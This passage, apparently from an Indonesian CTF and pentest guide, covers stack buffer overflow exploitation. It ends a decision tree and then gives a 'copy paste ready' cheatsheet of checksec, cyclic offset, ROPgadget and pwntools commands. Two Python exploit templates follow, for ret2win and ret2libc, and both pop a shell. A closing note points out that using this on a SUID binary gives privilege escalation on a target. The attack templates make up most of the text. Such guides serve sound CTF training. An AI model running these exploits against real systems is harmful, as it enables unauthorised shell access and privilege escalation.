│   ├─ [NX ON + win()] → Fase 4A (ret2win)
│   ├─ [NX ON + no win() + PIE OFF] → Fase 4B (ret2libc simple)
│   └─ [NX ON + no win() + ASLR/PIE ON] → Fase 4C (leak + ROP)
│
└─ Setelah dapat shell:
    ├─ cat flag.txt
    ├─ whoami / id
    └─ Jika perlu privesc → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === ANALISIS AWAL ===
file ./binary
checksec --file=./binary
nm ./binary | grep -E 'win|flag|shell|gets|system'
ldd ./binary

# === CARI OFFSET ===
python3 -c 'from pwn import *; sys.stdout.buffer.write(cyclic(300))' > /tmp/c.bin
gdb ./binary
# > run < /tmp/c.bin
# > x/1gx $rsp  (64-bit)
# > cyclic -l $rsp
python3 -c 'from pwn import *; print(cyclic_find(0xVALUE, n=8))'  # 64-bit
python3 -c 'from pwn import *; print(cyclic_find(0xVALUE))'        # 32-bit

# === CARI GADGET ===
ROPgadget --binary ./binary | grep "pop rdi"
ROPgadget --binary ./binary | grep ": ret$"
python3 -c "from pwn import *; elf=ELF('./binary'); rop=ROP(elf); print(hex(rop.find_gadget(['pop rdi','ret'])[0]))"

# === CARI SYMBOL ===
python3 -c "from pwn import *; e=ELF('./binary'); print(hex(e.sym['win']))"
python3 -c "from pwn import *; e=ELF('./binary'); print(list(e.plt.keys()))"

# === LIBC ===
python3 -c "from pwn import *; l=ELF('/lib/x86_64-linux-gnu/libc.so.6'); print(hex(l.sym['system'])); print(hex(next(l.search(b'/bin/sh'))))"
```

Python

```
# === TEMPLATE ret2win ===
from pwn import *
elf = ELF("./binary", checksec=False); context.binary = elf
OFFSET = 72; WIN = elf.sym["win"]
rop = ROP(elf); RET = rop.find_gadget(["ret"])[0]
payload = flat(b"A"*OFFSET, p64(RET), p64(WIN))
p = process(elf.path)
p.sendline(payload); p.interactive()

# === TEMPLATE ret2libc (ASLR off) ===
from pwn import *
elf = ELF("./binary", checksec=False); context.binary = elf
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
OFFSET = 72
rop = ROP(elf)
POP_RDI = rop.find_gadget(["pop rdi","ret"])[0]
RET = rop.find_gadget(["ret"])[0]
# Set libc.address setelah tahu base!
SYSTEM = libc.sym["system"]; BINSH = next(libc.search(b"/bin/sh\x00"))
payload = flat(b"A"*OFFSET, p64(RET), p64(POP_RDI), p64(BINSH), p64(SYSTEM))
p = process(elf.path); p.sendline(payload); p.interactive()
```

---

> **➡️ NEXT:** Setelah memahami BOF dasar, lanjut ke **[🔗 50 — ROP Chain Workflow](/docs/rop-chain)** untuk teknik ROP chain yang lebih kompleks (leak libc dengan ASLR, ret2csu, dll), dan **[🧭 BAGIAN 0: FONDASI REVERSE ENGINEERING](/docs/reverse-engineering)** jika binary perlu di-reverse lebih dalam untuk menemukan vulnerability.
> 
> **⬅️ BACK:** Jika binary belum teridentifikasi tipe vulnerability-nya, kembali ke **[🔬 48 — Binary Analysis Workflow](/docs/binary-analysis)**.
> 
> **🔗 CROSS-REFERENCE:** Jika binary ini adalah SUID binary di sistem target → hasilnya bisa langsung jadi privilege escalation → **`<a href="/docs/sudo-suid-capabilities" class="text-[#00b4d8] hover:underline font-mono font-semibold">47_sudo_suid_capabilities_workflow.md</a>`**.

